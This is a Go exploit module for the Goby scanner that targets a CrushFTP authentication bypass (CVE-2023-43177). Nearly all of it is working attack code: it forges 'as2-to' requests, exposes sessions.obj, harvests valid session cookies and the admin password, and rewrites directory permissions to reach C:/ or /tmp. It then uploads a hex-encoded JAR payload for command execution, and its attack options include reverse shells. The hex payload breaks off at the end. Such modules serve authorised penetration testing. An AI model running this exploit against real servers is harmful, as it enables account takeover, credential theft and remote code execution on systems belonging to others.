package exploits

import (
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "CrushFTP as2-to Authentication Permission bypass Vulnerability (CVE-2023-43177)",
    "Description": "<p>CrushFTP is a powerful file transfer server suitable for secure and efficient file transfer and management for individual or enterprise users.</p><p>CrashFTP has a permission bypass vulnerability, where attackers can bypass system permission control by constructing malicious as2 to request authentication, achieving arbitrary execution of malicious operations such as file read and delete.</p>",
    "Product": "crushftp-WebInterface",
    "Homepage": "https://www.crushftp.com/index.html",
    "DisclosureDate": "2023-11-16",
    "PostTime": "2023-11-30",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "GobyQuery": "server=\"CrushFTP\" || header=\"/WebInterface/login.html\" || banner=\"/WebInterface/login.html\" || header=\"/WebInterface/w3c/p3p.xml\" || banner=\"/WebInterface/w3c/p3p.xml\" || title=\"CrushFTP\"",
    "Level": "3",
    "Impact": "<p>CrashFTP has a permission bypass vulnerability, where attackers can bypass system permission control by constructing malicious as2 to request authentication, achieving arbitrary execution of malicious operations such as file read and delete.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.crushftp.com/download.html\">https://www.crushftp.com/download.html</a></p>",
    "References": [
        "https://convergetp.com/2023/11/16/crushftp-zero-day-cve-2023-43177-discovered/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sessions.obj,login,password,cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "Command Execution",
        "Information Disclosure"
    ],
    "VulType": [
        "Command Execution",
        "Information Disclosure",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-43177"
    ],
    "CNNVD": [
        "CNNVD-202311-1602"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "CrushFTP as2-to 认证权限绕过漏洞（CVE-2023-43177）",
            "Product": "crushftp-WebInterface",
            "Description": "<p>CrushFTP 是一个强大的文件传输服务器，适用于个人用户或企业用户进行安全、高效的文件传输和管理。</p><p>CrushFTP 存在权限绕过漏洞，攻击者可通过构造恶意的 as2-to 请求认证，从而绕过系统权限控制，达到任意执行文件读取和删除等恶意操作。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.crushftp.com/download.html\" target=\"_blank\">https://www.crushftp.com/download.html</a></p>",
            "Impact": "<p>CrushFTP 存在权限绕过漏洞，攻击者可通过构造恶意的 as2-to 请求认证，从而绕过系统权限控制，达到任意执行文件读取和删除等恶意操作。</p>",
            "VulType": [
                "权限绕过",
                "命令执行",
                "信息泄露"
            ],
            "Tags": [
                "权限绕过",
                "命令执行",
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "CrushFTP as2-to Authentication Permission bypass Vulnerability (CVE-2023-43177)",
            "Product": "crushftp-WebInterface",
            "Description": "<p>CrushFTP is a powerful file transfer server suitable for secure and efficient file transfer and management for individual or enterprise users.</p><p>CrashFTP has a permission bypass vulnerability, where attackers can bypass system permission control by constructing malicious as2 to request authentication, achieving arbitrary execution of malicious operations such as file read and delete.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.crushftp.com/download.html\" target=\"_blank\">https://www.crushftp.com/download.html</a></p>",
            "Impact": "<p>CrashFTP has a permission bypass vulnerability, where attackers can bypass system permission control by constructing malicious as2 to request authentication, achieving arbitrary execution of malicious operations such as file read and delete.</p>",
            "VulType": [
                "Command Execution",
                "Information Disclosure",
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "Command Execution",
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10885"
}`

	splitCookieFlagCOISUAD := func(cookie string) (string, error) {
		c2fMatchResult := regexp.MustCompile(`currentAuth=(\w{4});`).FindStringSubmatch(cookie)
		if len(c2fMatchResult) < 2 {
			return "", errors.New("currentAuth认证失败！")
		}
		return c2fMatchResult[1], nil
	}

	getCookieFlagCOISUAD := func(hostInfo *httpclient.FixUrl) (string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/WebInterface/function/")
		getRequestConfig.Header.Store("as2-to", "X")
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		getRequestConfig.Header.Store("user_name", "rushadmin")
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		} else if strings.Contains(resp.Cookie, "CrushAuth") && strings.Contains(resp.Cookie, "currentAuth") {
			return resp.Cookie, nil
		}
		return "", errors.New("漏洞利用失败")
	}

	// 移动 sessions.obj
	moveSessionsObjFalgXOIUCSAD := func(hostInfo *httpclient.FixUrl, cookie string) (bool, error) {
		// 拆分 c2f
		c2f, err := splitCookieFlagCOISUAD(cookie)
		if err != nil {
			return false, err
		}
		moveSessionRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/?command=getUsername&c2f=" + c2f)
		moveSessionRequestConfig.FollowRedirect = false
		moveSessionRequestConfig.VerifyTls = false
		moveSessionRequestConfig.Header.Store("as2-to", "X")
		moveSessionRequestConfig.Header.Store("user_name", "crushadmin")
		moveSessionRequestConfig.Header.Store("user_log_file", "sessions.obj")
		moveSessionRequestConfig.Header.Store("user_log_path_custom", "WebInterface/")
		moveSessionRequestConfig.Header.Store("user_log_path", "./")
		moveSessionRequestConfig.Header.Store("dont_log", "true")
		moveSessionRequestConfig.Header.Store("Cookie", cookie)
		moveSessionRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		moveSessionRequestConfig.Header.Store("Content-Length", "9")
		moveSessionRequestConfig.Data = "post=body"
		resp, err := httpclient.DoHttpRequest(hostInfo, moveSessionRequestConfig)
		return resp != nil && strings.Contains(resp.Utf8Html, "loginResult") && strings.Contains(resp.Utf8Html, "success") && strings.Contains(resp.Utf8Html, "</username>"), err
	}

	getSessionContentCOXLIYUHJWERPO := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/WebInterface/sessions.obj")
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	// 获取 sessions.obj 文件内容
	getSessionsObjFileDKPSOAIDCMOPAS := func(hostInfo *httpclient.FixUrl) (string, error) {
		cookie, err := getCookieFlagCOISUAD(hostInfo)
		if err != nil {
			return "", err
		}
		moveFlag, err := moveSessionsObjFalgXOIUCSAD(hostInfo, cookie)
		if err != nil {
			return "", err
		} else if !moveFlag {
			return "", errors.New("漏洞利用失败")
		}
		resp, err := getSessionContentCOXLIYUHJWERPO(hostInfo)
		if resp != nil && resp.Header != nil && strings.Contains(resp.HeaderString.String(), `application/binary`) && strings.Contains(resp.HeaderString.String(), `bytes`) && len(resp.RawBody) > 0 {
			return resp.RawBody, nil
		}
		return "", err
	}

	verifyCookieFlagXCIOUHDPASFASODIJ := func(hostInfo *httpclient.FixUrl, cookie string) (bool, error) {
		// 拆分 c2f
		c2f, err := splitCookieFlagCOISUAD(cookie)
		if err != nil {
			return false, err
		}
		verifyRequestConfig := httpclient.NewPostRequestConfig(`/WebInterface/function/`)
		verifyRequestConfig.VerifyTls = false
		verifyRequestConfig.FollowRedirect = false
		verifyRequestConfig.Header.Store(`Cookie`, cookie)
		verifyRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		verifyRequestConfig.Header.Store("Origin", hostInfo.HostInfo)
		verifyRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		verifyRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		verifyRequestConfig.Data = `command=getServerItem&key=server_settings&c2f=` + c2f
		resp, err := httpclient.DoHttpRequest(hostInfo, verifyRequestConfig)
		if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<response_status>") && strings.Contains(resp.Utf8Html, "<response_type>") && strings.Contains(resp.Utf8Html, "ip_restrictions") {
			return true, nil
		} else if err != nil {
			return false, err
		}
		return false, nil
	}

	// 读取当前登录用户名
	getUsernameFlagMOICASJEIODJ := func(hostInfo *httpclient.FixUrl, cookie string) (string, error) {
		// 拆分 c2f
		c2f, err := splitCookieFlagCOISUAD(cookie)
		if err != nil {
			return "", err
		}
		moveSessionRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/?command=getUsername&c2f=" + c2f)
		moveSessionRequestConfig.FollowRedirect = false
		moveSessionRequestConfig.VerifyTls = false
		moveSessionRequestConfig.Header.Store("Cookie", cookie)
		moveSessionRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		moveSessionRequestConfig.Header.Store("Content-Length", "9")
		moveSessionRequestConfig.Data = "post=body"
		resp, err := httpclient.DoHttpRequest(hostInfo, moveSessionRequestConfig)
		if resp != nil && strings.Contains(resp.Utf8Html, "loginResult") && strings.Contains(resp.Utf8Html, "success") && len(regexp.MustCompile(`<username>([\w\W]*?)</username>`).FindStringSubmatch(resp.RawBody)) > 1 {
			return regexp.MustCompile(`<username>([\w\W]*?)</username>`).FindStringSubmatch(resp.RawBody)[1], err
		}
		return "", err
	}

	// 从 sessions.obj 提取有效 cookie
	getLoginCookieFlagMOICASJEIOD := func(hostInfo *httpclient.FixUrl) (string, error) {
		sessionsObj, err := getSessionsObjFileDKPSOAIDCMOPAS(hostInfo)
		if err != nil {
			return "", err
		}
		cookies := regexp.MustCompile(`CrushAuth=(.*?);`).FindAllStringSubmatch(sessionsObj, -1)
		if len(cookies) < 1 || len(cookies[0]) < 1 {
			return "", errors.New("Cookie 获取失败！")
		}
		var cookiesInfo [][]string
		for i := 0; i < len(cookies); i++ {
			if len(cookies[i]) < 2 {
				continue
			}
			timeStamp := regexp.MustCompile(`\d{13}`).FindStringSubmatch(cookies[i][1]) // 匹配时间戳
			if len(timeStamp) < 1 {
				continue
			}
			crushAuthIndex := strings.Index(cookies[i][0], "CrushAuth=")
			if crushAuthIndex == -1 {
				continue
			}
			// cookiesInfo 结构：[0]["CrushAuth=1688512518306_1cnQZstKgevbv0tivEv7bJIHWQ9enP;currentAuth=9enP;",1688512518306]
			// CrushAuth=1688512518306_1cnQZstKgevbv0tivEv7bJIHWQ9enP;currentAuth=9enP;
			cookie := cookies[i][0][crushAuthIndex:crushAuthIndex+54] + ";" + "currentAuth=" + cookies[i][0][crushAuthIndex+50:crushAuthIndex+54] + ";"
			cookiesInfo = append(cookiesInfo, []string{cookie, timeStamp[0]})
		}
		// 根据时间戳排序
		sort.Slice(cookiesInfo, func(i, j int) bool {
			return cookiesInfo[i][1] > cookiesInfo[j][1]
		})
		for i := 0; i < len(cookiesInfo); i++ {
			cookie := cookiesInfo[i][0]
			if success, err := verifyCookieFlagXCIOUHDPASFASODIJ(hostInfo, cookie); err != nil {
				return "", err
			} else if success {
				return cookie, nil
			}
		}
		return "", errors.New("无有效 Cookie")
	}

	// 获取有效的Cookie
	checkSystemPlatformOCIQWUJDEOIASJD := func(hostInfo *httpclient.FixUrl, cookie, c2f string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postRequestConfig.Data = `c2f=` + c2f + `&command=getAdminXMLListing&format=JSON&file_mode=user&path=%2F&random=0.38551544592016374&serverGroup=MainUsers`
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		if resp != nil && strings.Contains(resp.RawBody, "name=\"C:\"") && strings.Contains(resp.RawBody, "listingInfo") {
			return "win", nil
		}
		return "linux", nil
	}

	// 读取当前登录用户密码
	getUserPasswordMOICASJEIODJ := func(hostInfo *httpclient.FixUrl, cookie string) (string, string, error) {
		// 拆分 c2f
		c2f, err := splitCookieFlagCOISUAD(cookie)
		if err != nil {
			return "", "", err
		}
		username, err := getUsernameFlagMOICASJEIODJ(hostInfo, cookie)
		if err != nil {
			return "", "", err
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.FollowRedirect = false
		postRequestConfig.VerifyTls = false
		postRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
		postRequestConfig.Header.Store("Cookie", cookie)
		postRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postRequestConfig.Header.Store("Origin", hostInfo.HostInfo)
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postRequestConfig.Data = `command=getUser&serverGroup=MainUsers&username=` + username + `&c2f=` + c2f
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if resp != nil && len(regexp.MustCompile(`<password>([\w\W]*?)</password>`).FindStringSubmatch(resp.RawBody)) > 1 {
			return username, regexp.MustCompile(`<password>([\w\W]*?)</password>`).FindStringSubmatch(resp.RawBody)[1], nil
		} else if err != nil {
			return "", "", err
		}
		return "", "", errors.New("漏洞利用失败")
	}

	// 读取当前目录当权限
	currentVirtualDirectoryPermissionsCOPIAJSEDWQE := func(hostInfo *httpclient.FixUrl, os, username, cookie, c2f string) (string, string, error) {
		currentVirtualRequestConfig := httpclient.NewPostRequestConfig(`/WebInterface/function/`)
		currentVirtualRequestConfig.VerifyTls = false
		currentVirtualRequestConfig.FollowRedirect = false
		currentVirtualRequestConfig.Header.Store(`Content-Type`, `application/x-www-form-urlencoded; charset=UTF-8`)
		currentVirtualRequestConfig.Header.Store(`Cookie`, cookie)
		currentVirtualRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		currentVirtualRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/UserManager/index.html")
		currentVirtualRequestConfig.Data = `command=getUser&serverGroup=MainUsers&username=` + username + `&c2f=` + c2f
		resp, err := httpclient.DoHttpRequest(hostInfo, currentVirtualRequestConfig)
		if err != nil {
			return "", "", err
		}
		vfsItems := regexp.MustCompile(`<vfs_items type="vector">[\w\W]*</vfs_items>`).FindString(resp.Utf8Html)
		permissions := regexp.MustCompile(`<permissions type="properties">[\w\W]*</permissions>`).FindString(resp.Utf8Html)
		permissions = strings.ReplaceAll(permissions, `<permissions type="properties">`, `<VFS type="properties">`)

		if !strings.Contains(vfsItems, `<modified>`) {
			vfsItems = strings.ReplaceAll(vfsItems, `<type>`, `<vfs_item type="vector">
<vfs_item_subitem type="properties">
<type>`)
		}
		if os == "win" {
			if !strings.Contains(strings.ToLower(resp.Utf8Html), `<url>file://c:/</url>`) {
				permissions = strings.ReplaceAll(permissions, `</permissions>`, `<item name="/C/">(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)(slideshow)</item>
</VFS>`)
				vfsItems = strings.ReplaceAll(vfsItems, `</vfs_items>`, `
<vfs_items_subitem type="vector">
<vfs_items_subitem_subitem type="properties">
<path>/</path>
<name>C</name>
<modified>1701288840630</modified>
<type>DIR</type>
<url>FILE://C:/</url>
</vfs_items_subitem_subitem>
</vfs_items_subitem>
</vfs_items>`)
			} else {
				permissions = regexp.MustCompile(`<item name="/C/">(.*?)</item>`).ReplaceAllString(permissions, `<item name="/C/">(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)(slideshow)</item>`)
				permissions = strings.ReplaceAll(permissions, `</permissions>`, `</VFS>`)
			}
		} else {
			if !strings.Contains(strings.ToLower(resp.Utf8Html), `<url>file://tmp/</url>`) {
				permissions = strings.ReplaceAll(permissions, `</permissions>`, `<item name="/">(read)(view)(resume)</item>
<item name="/TMP/">(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)(slideshow)</item>
</VFS>`)
				vfsItems = strings.ReplaceAll(vfsItems, `</vfs_items>`, `
<vfs_items_subitem type="vector">
<vfs_items_subitem_subitem type="properties">
<path>/</path>
<name>tmp</name>
<modified>1701288840630</modified>
<type>DIR</type>
<url>FILE://tmp/</url>
</vfs_items_subitem_subitem>
</vfs_items_subitem>
</vfs_items>`)
			} else {
				permissions = regexp.MustCompile(`<item name="/TMP/">(.*?)</item>`).ReplaceAllString(permissions, `<item name="/TMP/">(read)(write)(view)(delete)(deletedir)(makedir)(rename)(resume)(share)(slideshow)</item>`)
				permissions = strings.ReplaceAll(permissions, `</permissions>`, `</VFS>`)
			}
		}
		vfsItems = strings.ReplaceAll(vfsItems, `<vfs_items_subitem type="vector">`, `<vfs_items_subitem type="properties">`)
		vfsItems = strings.ReplaceAll(vfsItems, `<modified>`, `<vfs_item type="vector">
<vfs_item_subitem type="properties">
<modified>`)
		vfsItems = strings.ReplaceAll(vfsItems, `<vfs_items_subitem_subitem type="properties">`, ``)
		vfsItems = strings.ReplaceAll(vfsItems, `</vfs_items_subitem_subitem>`, `</vfs_item_subitem>
</vfs_item>`)
		vfsItems = `<?xml version="1.0" encoding="UTF-8"?>` + vfsItems
		permissions = `<?xml version="1.0" encoding="UTF-8"?>` + permissions
		return permissions, vfsItems, nil
	}

	// 创建虚拟目录并映射到物理目录/tmp下
	createVirtualDirectoryCOWJUIEHNSAJXCPOI := func(hostInfo *httpclient.FixUrl, username, os, cookie, c2f string) (bool, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postRequestConfig.Header.Store("Cookie", cookie)
		permissions, vfsItems, err := currentVirtualDirectoryPermissionsCOPIAJSEDWQE(hostInfo, os, username, cookie, c2f)
		if err != nil {
			return false, err
		}
		userXml := `&command=getUserXMLListing&format=JSON&file_mode=user&path=%2F&random=0.21356421094777867&serverGroup=MainUsers&username=` + username + `&permissions=` + url.QueryEscape(permissions) + `&vfs_items=` + url.QueryEscape(vfsItems)
		postRequestConfig.Data = `c2f=` + c2f + userXml
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		return err == nil && resp != nil && strings.Contains(resp.Utf8Html, "<path>") && strings.Contains(resp.Utf8Html, `href_path`), err
	}

	// 设置虚拟目录的文件上传功能
	settingVirtualDirectoryCOPIAJSEDWQE := func(hostInfo *httpclient.FixUrl, os, username, password, cookie, c2f string) (bool, error) {
		// 读取当前权限
		permissions, vfsItems, err := currentVirtualDirectoryPermissionsCOPIAJSEDWQE(hostInfo, os, username, cookie, c2f)
		if err != nil {
			return false, err
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postRequestConfig.Header.Store("Cookie", cookie)
		userXml := `&command=setUserItem&data_action=replace&serverGroup=MainUsers&username=` + username + `&user=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E+%3Cuser+type%3D%22properties%22%3E%0D%0A%3Cuser_name%3Ecrushadmin%3C%2Fuser_name%3E%0D%0A%3Cpassword%3E` + password + `%3C%2Fpassword%3E%0D%0A%3Cextra_vfs+type%3D%22vector%22%3E%0D%0A%3C%2Fextra_vfs%3E%0D%0A%3Cmax_idle_time%3E0%3C%2Fmax_idle_time%3E%0D%0A%3Cversion%3E1.0%3C%2Fversion%3E%0D%0A%3Croot_dir%3E%2F%3C%2Froot_dir%3E%0D%0A%3CuserVersion%3E6%3C%2FuserVersion%3E%0D%0A%3Cmax_logins%3E0%3C%2Fmax_logins%3E%0D%0A%3Cmax_logins_ip%3E8%3C%2Fmax_logins_ip%3E%0D%0A%3Clogins_ip_auto_kick%3Efalse%3C%2Flogins_ip_auto_kick%3E%0D%0A%3Cignore_max_logins%3Etrue%3C%2Fignore_max_logins%3E%0D%0A%0D%0A%3Csite%3E(CONNECT)%0D%0A%3C%2Fsite%3E%0D%0A%3Ccreated_by_username%3Ecrushadmin%3C%2Fcreated_by_username%3E%0D%0A%3Ccreated_by_email%3E%3C%2Fcreated_by_email%3E%0D%0A%3Ccreated_time%3E11292023024326%3C%2Fcreated_time%3E%0D%0A%3Cpassword_history%3E%3C%2Fpassword_history%3E%3Clast_logins%3E11%2F29%2F2023+02%3A41%3A02+AM%2C11%2F29%2F2023+02%3A37%3A10+AM%2C11%2F29%2F2023+02%3A35%3A28+AM%2C11%2F28%2F2023+06%3A58%3A44+AM%3C%2Flast_logins%3E%3C%2Fuser%3E&xmlItem=user&vfs_items=` + url.QueryEscape(vfsItems) + `&permissions=` + url.QueryEscape(permissions)
		postRequestConfig.Data = `c2f=` + c2f + userXml
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		return err == nil && resp != nil && strings.Contains(resp.RawBody, `<response_status>OK</response_status>`), err
	}

	//	执行文件上传
	uploadSqlDriverJarFileCOPIAJSEDWQE := func(hostInfo *httpclient.FixUrl, os, filename, cookie, c2f string) (bool, error) {
		// 读取用户名、密码
		if username, password, err := getUserPasswordMOICASJEIODJ(hostInfo, cookie); err != nil {
			return false, err
		} else {
			if success, err := createVirtualDirectoryCOWJUIEHNSAJXCPOI(hostInfo, username, os, cookie, c2f); err != nil {
				return false, err
			} else if !success {
				return false, errors.New("漏洞利用失败")
			}
			// 设置虚拟目录
			if success, err := settingVirtualDirectoryCOPIAJSEDWQE(hostInfo, os, username, password, cookie, c2f); err != nil {
				return false, err
			} else if !success {
				return false, errors.New("漏洞利用失败")
			}
		}
		if os == "win" {
			filename = "/C/" + filename
		} else {
			filename = "/tmp/" + filename
		}
		uploadId := "DUybCNxF" + goutils.RandomHexString(4)
		postFormRequestConfig := httpclient.NewPostRequestConfig("/WebInterface/function/")
		postFormRequestConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		postFormRequestConfig.Header.Store("Origin", hostInfo.FixedHostInfo)
		postFormRequestConfig.Header.Store("Referer", hostInfo.FixedHostInfo+"/WebInterface/Preferences/index.html")
		postFormRequestConfig.Header.Store("Cookie", cookie)
		postFormRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryrEMS597BIAtQQuIR")
		postFormRequestConfig.Data = "------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"command\"\r\n\r\nopenFile\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"upload_path\"\r\n\r\n" + filename + "\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"upload_size\"\r\n\r\n3497\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"upload_id\"\r\n\r\n" + uploadId + "\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"start_resume_loc\"\r\n\r\n0\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR\r\nContent-Disposition: form-data; name=\"c2f\"\r\n\r\n" + c2f + "\r\n------WebKitFormBoundaryrEMS597BIAtQQuIR--\r\n"
		formResponse, err := httpclient.DoHttpRequest(hostInfo, postFormRequestConfig)
		if err != nil {
			return false, err
		} else if !(err == nil && formResponse != nil && strings.Contains(formResponse.RawBody, `<response>`+uploadId)) {
			return false, errors.New("文件上传失败")
		}
		fileContent, _ := hex.DecodeString("504b03041400080808006d997c57000000000000000000000000140004004d4554412d494e462f4d414e49464553542e4d46feca0000f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5f24dccccd375ce492c2eb652c82f4ad72b012ad17329ca2c4b2de2e5e2e50200504b070864a925cc3700000036000000504b03040a00000800006d997c57000000000000000000000000040000006f72672f504b03040a00000800006d997c57000000000000000000000000090000006f72672f746573742f504b03041400080808006d997c57000000000000000000000000150000006f72672f746573742f4472697665722e636c6173738d57096014d519fede667767b29940d884840062b873b28814eb46b902d86808d14520625b87cd900c6c6696d95908adf6405babb52d6ad5423d6a6d4d5bb58d56162a555aad56ec69ed7d9ff6b6776d154dbf37bbd96c96851ac87b6fdefbefff7bfffff2ccab8f3c0660a95812420cf728f8988a8f87702f8643b8049f08c1874faaf854080b719f8afbe5fc808a4fcbf933926244c583f2e321159f2de7f7c3211c42460e87e5e711059f0b612a1e91c3511557abf8bc647b54c563211c935a16e20b2abe28e7c7553ca1e24b0a9e0c610eee91c3532abe2ce7a7151c5731a4e219155f51f155155f0be1ebf8861cbea9e0d910be85e74288e0db2abe23e7efcae17b72f8be3cfb811c7ea8e04721bc1e4fabf8b18a9f48de9f2af85908e7e3e772784e12fd42aebce19721fc0abf96c36f42781ebf95c3ef02c8fe2c910efd5e32fc41d2fe51cafd9374e2cf2a5e50f0171981bf4a4fffa6e0ef0afea1e09f0afe25e0339302e1ae1dfa6e3d92d0adfe48cc754cabbf5dc09fb41d57a0bae0acd3728d7ec3e161f03cd332dde502658d4d9b48db61f7190293bb4ccbe84e0f6e339c8dfab6842125db713db149774cf99ddbf4bb03664a604a97edf4475c23e546d638e66e4fae12b72dcb8853ef8ac6938dcaeea45d3311e971eca4e1b8a6916a6fca6ea77625221d596ed3b628ab2ced24a8ccb4b6db02b5a57905426b87e24652b2a414fc5b209074eca1bd020b4ae86f2a152775c04eb99d9e92eaada50882ee8063e87d13c3bcd1db6b97fa74471f14a88cb97a7ce77a3de90549c14e9a6e0c19715a28a7b46b740c528648e553e2f9128beb74d94b899d769369464e30c4530b54e51d9431894b213e9b52143a1a3752a98929eec96eb613df0a5e24923db83c49a42af80f991c83894a51436d89f8744a2c94a7068c44a2477707684a52a6d9a3b30c3712b3e33b0d9766f89266de46d326ae68386518faa07748f1be942957e39923d906cfc171ba144f45276f8c82ff2a7889918a270cdde9c90634a4c7a5dfa94b2fe9a2ae52d9bc8c88ed37dc1c1cf66673f886d78ebbade3c0cb02b850527b56f87a7d87ed6c62c8187fefb674e6f64dab60bf7247dfb678873d984c98bae57a7463c6e98e61b95d763fef9dc0ccc6a6025b12dca57991ec2953f632399d34e5856276da891beb4c79dd2ab2c62d928c1a2ec35681e9e32e5e92b65c73d0c88384b04ba70c47c1090dafc0d4302087cbf0aa00348c32e2a88adb8383bad5d760d96e83954e243421848f509e2b7f3451865b34dc0c26504435e117018139632c39fc34c84bd3b0dd760675b7c1701cdb99ad6113362b22a80945a89a2817210d5bd04b75c5b786e6880a4d68d293c04af9a3619754a7d8a945963e6828a2521393a449657b4c4b13934595ac678c1551d34617eb8a53bc3a6d26fa0c4713534498421bdaac86a59aa89622aa8a69292312f788dc86a5128603526a5c11359a982a6a698ba823ec4fbaa3bc4f9a9826eaa5f9d3c972b9ae891962a626cec0ed9a98257c9a3893a7a241fa555de2fed2c1c836d38a48850a2ff2221606a96d36a15274c764c6aed1c41cc174ccc3edbc209a988f039a588003bc2a9a58281a35d184ad9a68162d9a6895676df27391b4232216d3c179f24760c66950ae89b3c889ab710d6d282ae71342b761db0eafac4f2e12c6aa38018b56b6454ccd93c52eee2a08c094932ad58450111ff69eac84ea12c545a0a6542d11682c54b7ced0ddb46374db6e2c9d944dd0e82bb0a0a6542de0252b2824a72837ac8d4163575a